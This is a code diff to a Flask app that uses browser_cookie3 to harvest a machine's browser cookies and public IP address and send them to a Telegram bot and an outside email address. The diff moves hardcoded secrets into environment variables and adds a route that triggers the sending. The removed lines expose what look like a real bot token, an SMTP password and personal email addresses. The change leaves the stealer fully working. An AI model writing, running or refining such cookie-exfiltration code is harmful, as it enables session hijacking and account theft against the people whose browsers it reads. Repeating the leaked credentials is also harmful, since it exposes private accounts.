@@ -4,22 +4,22 @@ import os
 import smtplib
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
-from flask import Flask
+from flask import Flask, redirect, url_for
 import browser_cookie3  # Import browser_cookie3 library
 from datetime import datetime
 import io  # Use io.StringIO to avoid saving cookies to a file
 
 app = Flask(__name__)
 
-TELEGRAM_BOT_TOKEN = '5444520238:AAHo9DY-sSdKi6wh36WEpTTLA2S5V6Pc5A8'
-TELEGRAM_CHAT_ID = '@blavkcap'
+TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
+TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')
 
 # Email settings
-SMTP_SERVER = 'smtp.hostinger.com'
-SMTP_PORT = 465
-EMAIL_ADDRESS = 'mail@lbrealty.online'
-EMAIL_PASSWORD = 'Johnson8666@'
-RECIPIENT_EMAIL = 'mickeyprosper7@gmail.com'
+SMTP_SERVER = os.environ.get('SMTP_SERVER')
+SMTP_PORT = int(os.environ.get('SMTP_PORT'))
+EMAIL_ADDRESS = os.environ.get('EMAIL_ADDRESS')
+EMAIL_PASSWORD = os.environ.get('EMAIL_PASSWORD')
+RECIPIENT_EMAIL = os.environ.get('RECIPIENT_EMAIL')
 
 def get_public_ip():
     try:
@@ -109,6 +109,11 @@ def send_cookies_to_email(cookies):
 
 @app.route('/')
 def index():
+    # Display a link to trigger the information sending process
+    return '<a href="/send-info">Send Cookies and IP Info</a>'
+
+@app.route('/send-info')
+def send_info():
     # Get public IP address
     ip_address = get_public_ip()
     print(f"User IP Address: {ip_address}")
@@ -129,7 +134,8 @@ def index():
     send_cookies_to_email(cookies_string)
     print("Email sent successfully")
     
-    return "Script executed and results sent."
+    return "Information sent successfully."
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5004)
+
